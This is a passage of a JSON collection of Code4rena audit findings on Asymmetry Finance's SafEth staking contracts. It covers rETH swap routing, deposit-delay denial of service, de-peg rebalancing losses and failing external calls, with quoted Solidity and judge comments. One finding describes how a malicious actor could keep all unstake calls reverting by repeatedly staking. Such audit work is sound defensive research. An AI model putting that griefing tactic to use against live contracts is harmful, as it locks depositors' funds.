      "content": "\nrETH is acquired using the Uniswap rETH/WETH pool. This solution has higher fees and lower liquidity than alternatives, which results in more lost user value than other solutions.\n\nThe Uniswap rETH/WETH pool that is used in Reth.sol to make swaps has a liquidity of `$5 million`. In comparison, the Balancer rETH/WETH pool has a liquidity of `$80 million`. Even the Curve rETH/WETH pool has a liquidity of `$8 million`. The greater liquidity should normally offer lower slippage to users. In addition, the fees to swap with the Balancer pool are only 0.04% compared to Uniswap's 0.05%. Even the Curve pool offers a lower fee than Uniswap with just a 0.037% fee. [This Dune Analytics dashboard](https://dune.com/drworm/rocketpool) shows that Balancer is where the majority of rETH swaps happen by volume.\n\nOne solution to finding the best swap path for rETH is to use RocketPool's [RocketSwapRouter.sol contract `swapTo()` function](https://etherscan.io/address/0x16d5a408e807db8ef7c578279beeee6b228f1c1c#code#F19#L64). When users visit the RocketPool frontend to swap ETH for rETH, this is the function that RocketPool calls for the user. RocketSwapRouter.sol automatically determines the best way to split the swap between Balancer and Uniswap pools.\n\n### Proof of Concept\n\nPools that can be used for rETH/WETH swapping:\n\n*   [Uniswap rETH/WETH pool](https://etherscan.io/address/0xa4e0faA58465A2D369aa21B3e42d43374c6F9613): `$5 million` in liquidity\n*   [Balancer rETH/WETH pool](https://app.balancer.fi/#/ethereum/pool/0x1e19cf2d73a72ef1332c882f20534b6519be0276000200000000000000000112)\n*   [Curve Finance rETH/ETH pool](https://curve.fi/#/ethereum/pools/factory-crypto-210/deposit): `$8 million` in liquidity\n\n[Line where Reth.sol swaps WETH for rETH](https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L101) with the Uniswap rETH/WETH pool.\n\n### Tools Used\n\nEtherscan, Dune Analytics\n\n### Recommended Mitigation Steps\n\nThe best solution is to use the same flow as RocketPool's frontend UI and to call `swapTo()` in [RocketSwapRouter.sol](https://etherscan.io/address/0x16d5a408e807db8ef7c578279beeee6b228f1c1c#code#F19#L64). An alternative is to modify Reth.sol to use the Balancer rETH/ETH pool for swapping instead of Uniswap's rETH/WETH pool to better conserve user value by reducing swap fees and reducing slippage costs.\n\n**[elmutt (Asymmetry) confirmed](https://github.com/code-423n4/2023-03-asymmetry-findings/issues/673#issuecomment-1500475916)**\n\n**[d3e4 (warden) commented](https://github.com/code-423n4/2023-03-asymmetry-findings/issues/673#issuecomment-1522589442):**\n > What is the issue here? This is an improvement proposal (QA). \n\n**[Picodes (judge) commented](https://github.com/code-423n4/2023-03-asymmetry-findings/issues/673#issuecomment-1525233121):**\n > My reasoning was that it's not an improvement proposal but a bug (sub-optimal of the AMM pool), hence it does qualify for Medium for \"leak of value\".\n> \n> I have to admit that I hesitated but I leaned towards Medium because of the label \"sponsor confirmed\" suggesting that this finding provided value for the sponsor.\n\n**Asymmetry mitigated**\n\n**Status:** Mitigation confirmed. Full details in reports from [d3e4](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/37) and [0x52](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/19).\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the Uniswap rETH/WETH pool that is used in Reth.sol to make swaps. This pool has a low liquidity and high fees compared to other solutions, resulting in more lost user value than necessary. The Balancer rETH/WETH pool has a liquidity of `$80 million` and a fee of 0.04%, while the Curve pool has a liquidity of `$8 million` and a fee of 0.037%. The majority of rETH swaps happen by volume on Balancer.\n\nOne solution to finding the best swap path for rETH is to use RocketPool's RocketSwapRouter.sol contract `swapTo()` function. This function automatically determines the best way to split the swap between Balancer and Uniswap pools.\n\nAn alternative is to modify Reth.sol to use the Balancer rETH/ETH pool for swapping instead of Uniswap's rETH/WETH pool. This would reduce swap fees and reduce slippage costs, helping to conserve user value. The bug report was confirmed and mitigation steps were taken, as detailed in reports from d3e4 and 0x52.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/673",
      "tags": [],
      "finders": [
        "yac",
        "peanuts",
        "0x52",
        "Ruhum"
      ]
    },
    {
      "id": "19931",
      "title": "[M-08] Possible DoS on `unstake()`",
      "impact": "MEDIUM",
      "content": "\nRocketPool rETH tokens have a [deposit delay](https://github.com/rocket-pool/rocketpool/blob/967e4d3c32721a84694921751920af313d1467af/contracts/contract/token/RocketTokenRETH.sol#L157-L172) that prevents any user who has recently deposited to transfer or burn tokens. In the past this delay was set to 5760 blocks mined (aprox. 19h, considering one block per 12s). This delay can prevent asymmetry protocol users from unstaking if another user staked recently.\n\nWhile it's not currently possible due to RocketPool's configuration, any future changes made to this delay by the admins could potentially lead to a denial-of-service attack on the `nstake()` mechanism. This is a major functionality of the asymmetry protocol, and therefore, it should be classified as a high severity issue.\n\n### Proof of Concept\n\nCurrently, the delay is set to zero, but if RocketPool admins decide to change this value in the future, it could cause issues. Specifically, protocol users staking actions could prevent other users from unstaking for a few hours. Given that many users call the stake function throughout the day, the delay would constantly reset, making the unstaking mechanism unusable. It's important to note that this only occurs when `stake()` is used through the `rocketDepositPool` route. If rETH is obtained from the Uniswap pool, the delay is not affected.\n\nA malicious actor can also exploit this to be able to block all `unstake` calls. Consider the following scenario where the delay was raised again to 5760 blocks. Bob (malicious actor) call `stakes()` with the minimum amount, consequently triggering deposit to RocketPool and resetting the deposit delay. Alice tries to `unstake` her funds, but during rETH burn, it fails due to the delay check, reverting the `unstake` call.\n\nIf Bob manages to repeatedly `stakes()` the minimum amount every 19h (or any other interval less then the deposit delay), all future calls to `unstake` will revert.\n\n### Recommended Mitigation Steps\n\nConsider modifying Reth derivative to obtain rETH only through the UniswapV3 pool, on average users will get less rETH due to the slippage, but will avoid any future issues with the deposit delay mechanism.\n\n**[toshiSat (Asymmetry) confirmed](https://github.com/code-423n4/2023-03-asymmetry-findings/issues/685#issuecomment-1500470612)**\n\n**[Picodes (judge) decreased severity to Medium](https://github.com/code-423n4/2023-03-asymmetry-findings/issues/685#issuecomment-1525247050)**\n\n**[Asymmetry mitigated](https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#mitigations-to-be-reviewed):**\n> Use Chainlink to get rETH.<br>\n\n**Status:** Not mitigated. Full details in report from [adriro](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/51) - and also shared below in the [Mitigation Review](#mitigation-review) section.\n\n\n\n***\n\n",
      "summary": "\nA bug was discovered in RocketPool's rETH tokens that can cause a denial-of-service attack on the unstake() mechanism of the asymmetry protocol. This bug is caused by the deposit delay set to 5760 blocks (approx. 19 hours) that prevents any user who has recently deposited to transfer or burn tokens. This delay can prevent asymmetry protocol users from unstaking if another user staked recently.\n\nA malicious actor can exploit this bug by repeatedly staking the minimum amount every 19 hours, blocking all unstake calls. This bug could be mitigated by modifying Reth derivative to obtain rETH only through the UniswapV3 pool, as users will avoid any future issues with the deposit delay mechanism. \n\nThe bug was confirmed by toshiSat (Asymmetry), and the severity was decreased to medium by Picodes (judge). However, the bug has not yet been mitigated, as the mitigation proposed by Asymmetry (using Chainlink to get rETH) was not successful. Further details on the bug and mitigation can be found in the report from adriro.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/685",
      "tags": [],
      "finders": [
        "Tricko",
        "rvierdiiev",
        "shaka"
      ]
    },
    {
      "id": "19930",
      "title": "[M-07] In de-peg scenario, forcing full exit from every derivative & immediately re-entering can cause big losses for depositors",
      "impact": "MEDIUM",
      "content": "\nIn a de-peg scenario, there will be a general flight to safety (`ETH`) from users across the board. All pools will have a uni-directional sell-pressure where users prefer to exchange derivative token for WETH.\n\nThere are 3 sources of losses in this scenario\n\n*   Protocol currently doesn't localize exit & force-exits all positions. So even non de-pegged assets are forced to exit causing further sell-side pressure that can further widen slippages\n\n*   Protocol immediately tries to re-enter the position based on new weights. Since de-peg in one asset can trigger de-peg in another (eg. USDT de-pegged immediately after UST collapse), immediately entering into another position after exiting one might cause more. A better approach would be to simply exit stressed positions & waiting out for the market/gas prices to settle down. Separating exit & re-entry functions can save depositors from high execution costs.\n\n*   Protocol is inefficiently exiting & re-entering the positions. Instead of taking marginal positions to rebalance, current implementation first fully exits & then re-enters back based on new weights (see POC below). Since any slippage losses are borne by depositors, a better implementation can save losses to users\n\n### Proof of Concept\n\n*   Assume positions are split in following ratio by value: 10% frax-Eth, 70% stEth and 20% rEth\n*   Now frax-Eth starts to de-peg, forcing protocol to exit frax-Eth and rebalance to say, 80% stEth and 20% rEth\n*   Current rebalancing first exits 70% stEth, 20% rEth and then re-enters 80% stEth and 20% rEth\n*   A marginal re-balancing would have only needed protocol to exit 10% frax-Eth and divert that 10% to stEth\n\nBy executing huge, unnecessary txns, protocol is exposing depositors to high slippage costs on the entire pool.\n\n### Recommended Mitigation Steps\n\nConsider following improvements to `rebalanceToWeights`:\n\n*   Separate exits & entries. Split the functionality to `exit` and `re-enter`. In stressed times or fast evolving de-peg scenarios, protocol owners should first ensure an orderly exit. And then wait for markets to settle down before re-entering new positions\n\n*   Localize exits, ie. if derivative A is de-pegging, first try to exit that derivative position before incurring exit costs on derivative B and C\n\n*   Implement a marginal re-balancing - for protocol's whose weights have increased, avoid exit and re-entry. Instead just increment/decrement based on marginal changes in net positions\n\n**[toshiSat (Asymmetry) acknowledged and commented](https://github.com/code-423n4/2023-03-asymmetry-findings/issues/765#issuecomment-1500385145):**\n > This is definitely valid, it would require a black swan event.  We have thought about this, and might implement this for v2.\n> \n> This should be half confirmed, because I think we will implement the marginal rebalancing. I'm not sure if this is High severity, I will leave that up to judge.\n\n**[Picodes (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-03-asymmetry-findings/issues/765#issuecomment-1514763624):**\n > The report shows how in case of a black swan event, the protocol could take a significant loss when calling `rebalanceToWeights` that could easily be avoided by implementing at least marginal re-balancings. \n> \n> However, considering that there is no need to call `rebalanceToWeights` even in the case of a black swan event unless there is a governance decision to do so, I think Medium Severity is appropriate.\n>\n > Note that even without black swan event, calling `rebalanceToWeights` would likely lead to a significant loss due to the current ineffective implementation. But there is no specific need to call this action unless the owner or the DAO wants to force the rebalancing.\n\n**[Asymmetry commented](https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#out-of-scope):**\n> Out of scope for mitigation review. Will need a black swan event to happen and will upgrade rebalanceToWeights later to handle this.\n\n\n\n***\n\n",
      "summary": "\nThis bug report focuses on the losses that could be incurred in a de-peg scenario, where users across the board would prefer to exchange derivative tokens for WETH. The protocol currently does not localize exits, and instead force-exits all positions, leading to a unidirectional sell-pressure which widens slippages. Additionally, the protocol is inefficiently exiting and re-entering positions, leading to further losses for the depositors.\n\nThe bug report provides a proof of concept that demonstrates how the protocol could incur losses, and recommends mitigation steps such as separating exit and re-entry functions, localizing exits, and implementing a marginal re-balancing. The report also states that these improvements could be implemented in version 2 and that the severity of the bug is Medium. The bug is also out of scope for mitigation review, as it requires a black swan event to happen.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/765",
      "tags": [],
      "finders": [
        "Co0nan",
        "yac",
        "Bahurum",
        "IgorZuk",
        "Tricko",
        "deliriusz",
        "adriro",
        "0Kage"
      ]
    },
    {
      "id": "19929",
      "title": "[M-06] DoS  due to external call failure",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L71-L91><br>\n<https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L113-L119><br>\n<https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L140-L153><br>\n<https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L66-L127><br>\n<https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/SfrxEth.sol#L60-L106><br>\n<https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/WstEth.sol#L61>\n\n### Impact\n\nWhen `stake()/unstake()/rebalanceToWeights()`, if any one of the derivatives fails to `deposit()/withdraw()`, the whole function will revert, causing DoS. The impacts include:\n\n*   users' fund would be locked for a period.\n*   contract become inoperable until the external call resumes\n\n### Proof of Concept\n\nIn `stake()`, each derivative iteration, `ethPerDerivative()` and `deposit()` will be called:\n\n```solidity\nFile: contracts/SafEth/SafEth.sol\n63:     function stake() external payable {\n\n71:         for (uint i = 0; i < derivativeCount; i++)\n72:             underlyingValue +=\n73:                 (derivatives[i].ethPerDerivative(derivatives[i].balance()) *\n74:                     derivatives[i].balance()) /\n75:                 10 ** 18;\n\n84:         for (uint i = 0; i < derivativeCount; i++) {\n\n91:             uint256 depositAmount = derivative.deposit{value: ethAmount}();\n\n```\n\nIn `unstake()`, each derivative is iterated to `withdraw()`:\n\n```solidity\nFile: contracts/SafEth/SafEth.sol\n108:     function unstake(uint256 _safEthAmount) external {\n\n113:         for (uint256 i = 0; i < derivativeCount; i++) {\n\n118:             derivatives[i].withdraw(derivativeAmount);\n119:         }\n```\n\nIn `rebalanceToWeights()`, each derivative is iterated to `withdraw()` and then `deposit()`:\n\n```solidity\n138:     function rebalanceToWeights() external onlyOwner {\n139:         uint256 ethAmountBefore = address(this).balance;\n140:         for (uint i = 0; i < derivativeCount; i++) {\n141:             if (derivatives[i].balance() > 0)\n142:                 derivatives[i].withdraw(derivatives[i].balance());\n143:         }\n\n147:         for (uint i = 0; i < derivativeCount; i++) {\n148:             if (weights[i] == 0 || ethAmountToRebalance == 0) continue;\n149:             uint256 ethAmount = (ethAmountToRebalance * weights[i]) /\n150:                 totalWeight;\n151:             // Price will change due to slippage\n152:             derivatives[i].deposit{value: ethAmount}();\n153:         }\n\n```\n\nFor each of the current derivatives, there are several different scenarios where the `ethPerDerivative()/deposit()/withdraw()` could fail.\n\n**SfrxEth.sol**\n\n*   `redeem()` could fail due to not enough allowance.\n\n```solidity\nFile: contracts/SafEth/derivatives/SfrxEth.sol\n60:     function withdraw(uint256 _amount) external onlyOwner {\n\n61:         IsFrxEth(SFRX_ETH_ADDRESS).redeem(\n62:             _amount,\n63:             address(this),\n64:             address(this)\n65:         );\n```\n\nBelow is sFrxEth contract code:\n\n```solidity\n// https://etherscan.io/address/0xac3E018457B222d93114458476f3E3416Abbe38F\n// line 691-700\n    function redeem(\n        uint256 shares,\n        address receiver,\n        address owner\n    ) public virtual returns (uint256 assets) {\n        if (msg.sender != owner) {\n            uint256 allowed = allowance[owner][msg.sender]; // Saves gas for limited approvals.\n\n            if (allowed != type(uint256).max) allowance[owner][msg.sender] = allowed - shares;\n        }\n```\n\n*   FrxEthEthPool `exchange()` could fail due to `minOut` requirement.\n\n```solidity\nFile: contracts/SafEth/derivatives/SfrxEth.sol\n60:     function withdraw(uint256 _amount) external onlyOwner {\n\n77:         IFrxEthEthPool(FRX_ETH_CRV_POOL_ADDRESS).exchange(\n78:             1,\n79:             0,\n80:             frxEthBalance,\n81:             minOut\n82:         );\n```\n\n*   `deposit()` could fail because `submitAndDeposit()` -> `_submit()` can be paused.\n\n```solidity\nFile: contracts/SafEth/derivatives/SfrxEth.sol\n094:     function deposit() external payable onlyOwner returns \n\n101:         frxETHMinterContract.submitAndDeposit{value: msg.value}(address(this));\n```\n\nBelow is the frxETHMinter contract:\n\n```solidity\n// https://etherscan.io/address/0xbAFA44EFE7901E04E39Dad13167D089C559c1138\n// frxETHMinter.sol: 70-101\n    function submitAndDeposit(address recipient) external payable returns (uint256 shares) {\n\n        _submit(address(this));\n\n    }\n\n    function _submit(address recipient) internal nonReentrant {\n\n        require(!submitPaused, \"Submit is paused\");\n\n    }\n\n```\n\nIf `submitPaused` is turned on, this deposit function will revert.\n\n**Reth.sol**\n\n*   `rethAddress()` and `getAddress()`\n\n`rethAddress()` is called in multiple places:\n\n```solidity\nFile: contracts/SafEth/derivatives/Reth.sol\n66:     function rethAddress() private view returns (address) {\n67:         return\n68:             RocketStorageInterface(ROCKET_STORAGE_ADDRESS).getAddress(\n69:                 keccak256(\n70:                     abi.encodePacked(\"contract.address\", \"rocketTokenRETH\")\n71:                 )\n72:             );\n73:     }\n```\n\nBut it could return wrong address or `addr(0)`, since the referred `getAddress()` could return unexpected result. `addressStorage[_key]` can be reset or deleted. Then the whole function call will revert.\n\nBelow is the RocketStorage.sol:\n\n```solidity\n// https://etherscan.io/address/0x1d8f8f00cfa6758d7bE78336684788Fb0ee0Fa46\n// 179-181\n    function getAddress(bytes32 _key) override external view returns (address r) {\n        return addressStorage[_key];\n    }\n\n// 215-217\n    function setAddress(bytes32 _key, address _value) onlyLatestRocketNetworkContract override external {\n        addressStorage[_key] = _value;\n    }\n\n// 251-253\n    function deleteAddress(bytes32 _key) onlyLatestRocketNetworkContract override external {\n        delete addressStorage[_key];\n    }    \n```\n\n`rethAddress()` is referred in `withdraw()/deposit()/ethPerDerivative()/balance()`:\n\n```solidity\nFile: contracts/SafEth/derivatives/Reth.sol\n107:     function withdraw(uint256 amount) external onlyOwner {\n108:         RocketTokenRETHInterface(rethAddress()).burn(amount);\n\n156:     function deposit() external payable onlyOwner returns (uint256) {\n\n176:             IWETH(W_ETH_ADDRESS).deposit{value: msg.value}();\n177:             uint256 amountSwapped = swapExactInputSingleHop(\n178:                 W_ETH_ADDRESS,\n179:                 rethAddress(),\n180:                 500,\n181:                 msg.value,\n182:                 minOut\n183:             );\n\n211:     function ethPerDerivative(uint256 _amount) public view returns (uint256) {\n212:         if (poolCanDeposit(_amount))\n213:             return\n214:                 RocketTokenRETHInterface(rethAddress()).getEthValue(10 ** 18);\n215:         else return (poolPrice() * 10 ** 18) / (10 ** 18);\n216:     }\n\n221:     function balance() public view returns (uint256) {\n222:         return IERC20(rethAddress()).balanceOf(address(this));\n223:     }\n```\n\n`getAddress()` will also influence `poolCanDeposit()`, which could revert `deposit()` and the view function `ethPerDerivative()`:\n\n```solidity\n120:     function poolCanDeposit(uint256 _amount) private view returns (bool) {\n121:         address rocketDepositPoolAddress = RocketStorageInterface(\n122:             ROCKET_STORAGE_ADDRESS\n123:         ).getAddress(\n124:                 keccak256(\n125:                     abi.encodePacked(\"contract.address\", \"rocketDepositPool\")\n126:                 )\n127:             );\n\n156:     function deposit() external payable onlyOwner returns (uint256) {\n\n170:         if (!poolCanDeposit(msg.value)) {\n\n211:     function ethPerDerivative(uint256 _amount) public view returns (uint256) {\n212:         if (poolCanDeposit(_amount))\n```\n\n*   `burn()`\n\nThere is no guarantee that the function `burn()` will succeed.\n\n```solidity\nFile: contracts/SafEth/derivatives/Reth.sol\n107:     function withdraw(uint256 amount) external onlyOwner {\n108:         RocketTokenRETHInterface(rethAddress()).burn(amount);\n```\n\nBecause in Reth contract code below, the execution may fail in several cases:\n\n*   `burn()` -> `getTotalCollateral()` -> `getContractAddress()` -> `getAddress()` might fail due to the same reason above\n*   the `require(ethBalance >= ethAmount)` could fail due to low balance\n*   `burn()` -> `withdrawDepositCollateral()` -> `getContractAddress()`, `withdrawExcessBalance()` both could fail for same reason as above\n*   `msg.sender.transfer()` could fail due to not enough gas (2300 limit)\n\n```solidity\n// https://etherscan.io/address/0xae78736Cd615f374D3085123A210448E74Fc6393\n// RocketTokenRETH.sol: 131-146\n    // Burn rETH for ETH\n    function burn(uint256 _rethAmount) override external {\n        // Check rETH amount\n        require(_rethAmount > 0, \"Invalid token burn amount\");\n        require(balanceOf(msg.sender) >= _rethAmount, \"Insufficient rETH balance\");\n        // Get ETH amount\n        uint256 ethAmount = getEthValue(_rethAmount);\n        // Get & check ETH balance\n        uint256 ethBalance = getTotalCollateral();\n        require(ethBalance >= ethAmount, \"Insufficient ETH balance for exchange\");\n        // Update balance & supply\n        _burn(msg.sender, _rethAmount);\n        // Withdraw ETH from deposit pool if required\n        withdrawDepositCollateral(ethAmount);\n        // Transfer ETH to sender\n        msg.sender.transfer(ethAmount);\n        // Emit tokens burned event\n        emit TokensBurned(msg.sender, _rethAmount, ethAmount, block.timestamp);\n    }\n\n// RocketTokenRETH.sol: 98-101\n    function getTotalCollateral() override public view returns (uint256) {\n        RocketDepositPoolInterface rocketDepositPool = RocketDepositPoolInterface(getContractAddress(\"rocketDepositPool\"));\n        return rocketDepositPool.getExcessBalance().add(address(this).balance);\n    }\n\n// RocketBase.sol: 112-119\n    function getContractAddress(string memory _contractName) internal view returns (address) {\n        // Get the current contract address\n        address contractAddress = getAddress(keccak256(abi.encodePacked(\"contract.address\", _contractName)));\n        // Check it\n        require(contractAddress != address(0x0), \"Contract not found\");\n        // Return\n        return contractAddress;\n    }\n\n// RocketTokenRETH.sol: 152-159\n    function withdrawDepositCollateral(uint256 _ethRequired) private {\n        // Check rETH contract balance\n        uint256 ethBalance = address(this).balance;\n        if (ethBalance >= _ethRequired) { return; }\n        // Withdraw\n        RocketDepositPoolInterface rocketDepositPool = RocketDepositPoolInterface(getContractAddress(\"rocketDepositPool\"));\n        rocketDepositPool.withdrawExcessBalance(_ethRequired.sub(ethBalance));\n    }\n```\n\n**WstEth.sol**\n\nStEthEthPool function `exchange()` could fail due to `minOut` requirement.\n\n```solidity\nFile: contracts/SafEth/derivatives/WstEth.sol\n56:     function withdraw(uint256 _amount) external onlyOwner {\n\n60:         uint256 minOut = (stEthBal * (10 ** 18 - maxSlippage)) / 10 ** 18;\n```\n\nAs long as any one of the above code failed, the whole `stake()/unstake()/rebalanceToWeights()` will revert, and users' fund would be locked until the external dependency is resolved, the contract will lose the core functionality.\n\n### Recommended Mitigation Steps\n\nUse `try/catch` to skip the failed function call, then the contract will be more robust to unexpected situations. In case of `deposit()`, redistribute the fund into the other derivatives according to the weights might be an option, since re-balance will be done regularly. For `withdraw()`, maybe temporarily record the missed amount, and give the user opportunity to retrieve later.\n\n**[toshiSat (Asymmetry) acknowledged](https://github.com/code-423n4/2023-03-asymmetry-findings/issues/770#issuecomment-1500378678)**\n\n**[elmutt (Asymmetry) commented](https://github.com/code-423n4/2023-03-asymmetry-findings/issues/770#issuecomment-1500380114):**\n > This is known and expected behavior. We feel like having all-or-nothing failures like this simplify the logic overall and make things safer at the expense of some edge cases where deposit can fail. We can always upgrade the contract if it becomes a problem.\n\n**[Asymmetry commented](https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#out-of-scope):**\n> Out of scope for mitigation review. This is as expected.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a potential issue in the code for the contract SafEth. The code contains functions `stake()/unstake()/rebalanceToWeights()` which could fail if any one of the derivatives fails to `deposit()/withdraw()`. This could cause a Denial of Service (DoS) attack, locking users' funds and making the contract inoperable until the external call resumes.\n\nThe code contains several different scenarios where the `ethPerDerivative()/deposit()/withdraw()` could fail, such as not enough allowance for the `redeem()` function, `minOut` requirement for the `exchange()` function, `submitPaused` turning on for the `submitAndDeposit()` function, wrong address or `addr(0)` returned by the `getAddress()` function, and the `burn()` function not succeeding.\n\nIt is recommended to use `try/catch` to skip the failed function call, as this will make the contract more robust to unexpected situations. For `deposit()`, redistributing the fund into the other derivatives according to the weights might be an option, since re-balancing will be done regularly. For `withdraw()`, temporarily recording the missed amount and giving the user an opportunity to retrieve it later might be a solution.\n\nAlthough the issue was acknowledged by Asymmetry, it was out of scope for mitigation review, as it is an expected behavior.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/770",
      "tags": [],
      "finders": [
        "HollaDieWaldfee",
        "volodya",
        "ladboy233",
        "kaden",
        "peanuts",
        "bytes032",
        "MiloTruck",
        "0xWaitress",
        "adriro",
        "m\\_Rassska",
        "AkshaySrivastav",
        "d3e4",
        "reassor",
        "Bauer",
        "hihen",
        "SaeedAlipoor01988",
        "0xbepresent",
        "UdarTeam",
        "lopotras",
        "Lirios",
        "\\_\\_141345\\_\\_",
        "Haipls",
        "hl\\_",
        "ck"
      ]
    },
    {
      "id": "19928",
      "title": "[M-05] Missing derivative limit and deposit availability checks will revert the whole `stake()` function",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L63><br>\n<https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/WstEth.sol#L73-L81><br>\n<https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L156-L204><br>\n<https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L170><br>\n<https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L120-L150>\n\n### Impact\n\nThe users will not be able to stake their funds and there will be loss of reputation\n\n### Proof of Concept\n\nThe `SafEth` contract's [`stake()`](https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L63) function is the main entry point to add liquid Eth to the derivatives. Accordingly the `stake()` function takes the users' ETH and convert it into various derivatives based on their weights and mint an amount of safETH that represents a percentage of the total assets in the system.\n\nThe execution to deposit to the available derivative is done through iterating the derivatives mapping in [`SafEthStorage`](https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEthStorage.sol#L22) contract.\n\n```solidity\nfunction stake() external payable {\n    require(pauseStaking == false, \"staking is paused\");\n    require(msg.value >= minAmount, \"amount too low\");\n    require(msg.value <= maxAmount, \"amount too high\");\n\n    uint256 underlyingValue = 0;\n\n    // Getting underlying value in terms of ETH for each derivative\n    for (uint i = 0; i < derivativeCount; i++)\n        underlyingValue +=\n            (derivatives[i].ethPerDerivative(derivatives[i].balance()) *\n                derivatives[i].balance()) /\n            10 ** 18;\n\n    uint256 totalSupply = totalSupply();\n    uint256 preDepositPrice; // Price of safETH in regards to ETH\n    if (totalSupply == 0)\n        preDepositPrice = 10 ** 18; // initializes with a price of 1\n    else preDepositPrice = (10 ** 18 * underlyingValue) / totalSupply;\n\n    uint256 totalStakeValueEth = 0; // total amount of derivatives worth of ETH in system\n    for (uint i = 0; i < derivativeCount; i++) {\n        uint256 weight = weights[i];\n        IDerivative derivative = derivatives[i];\n        if (weight == 0) continue;\n        uint256 ethAmount = (msg.value * weight) / totalWeight;\n\n        // This is slightly less than ethAmount because slippage\n        uint256 depositAmount = derivative.deposit{value: ethAmount}();\n        uint derivativeReceivedEthValue = (derivative.ethPerDerivative(\n            depositAmount\n        ) * depositAmount) / 10 ** 18;\n        totalStakeValueEth += derivativeReceivedEthValue;\n    }\n    // mintAmount represents a percentage of the total assets in the system\n    uint256 mintAmount = (totalStakeValueEth * 10 ** 18) / preDepositPrice;\n    _mint(msg.sender, mintAmount);\n    emit Staked(msg.sender, msg.value, mintAmount);\n}\n```\n\nAnd for all the derivatives the stake function calls the derivative contract's `deposit()` function. Below is for [`WstEth`](https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/WstEth.sol#L73-L81) contract's `deposit()` function to adapt to Lido staking;\n\n```solidity\nfunction deposit() external payable onlyOwner returns (uint256) {\n    uint256 wstEthBalancePre = IWStETH(WST_ETH).balanceOf(address(this));\n    // solhint-disable-next-line\n    (bool sent, ) = WST_ETH.call{value: msg.value}(\"\");\n    require(sent, \"Failed to send Ether\");\n    uint256 wstEthBalancePost = IWStETH(WST_ETH).balanceOf(address(this));\n    uint256 wstEthAmount = wstEthBalancePost - wstEthBalancePre;\n    return (wstEthAmount);\n}\n```\n\nThe Lido protocol implements a daily staking limit both for `stETH` and `WstETH` as per their [docs](https://docs.lido.fi/guides/steth-integration-guide/#staking-rate-limits)\nAccordingly the daily rate is 150000 ETH and the `deposit()` function will revert if the limit is hit. From the docs:\n\n> ***Staking rate limits***\n> In order to handle the staking surge in case of some unforeseen market conditions, the Lido protocol implemented staking rate limits aimed at reducing the surge's impact on the staking queue & Lidos socialized rewards distribution model. There is a sliding window limit that is parametrized with \\_maxStakingLimit and \\_stakeLimitIncreasePerBlock. This means it is only possible to submit this much ether to the Lido staking contracts within a 24 hours timeframe. Currently, the daily staking limit is set at ***150,000 ether***.\n> You can picture this as a health globe from Diablo 2 with a maximum of \\_maxStakingLimit and regenerating with a constant speed per block. When you deposit ether to the protocol, the level of health is reduced by its amount and the current limit becomes smaller and smaller. ***When it hits the ground, transaction gets reverted.***\n> To avoid that, you should check if `getCurrentStakeLimit() >= amountToStake`, and if it's not you can go with an alternative route. The staking rate limits are denominated in ether, thus, it makes no difference if the stake is being deposited for stETH or using the wstETH shortcut, the limits apply in both cases.\n\nHowever this check was not done either in 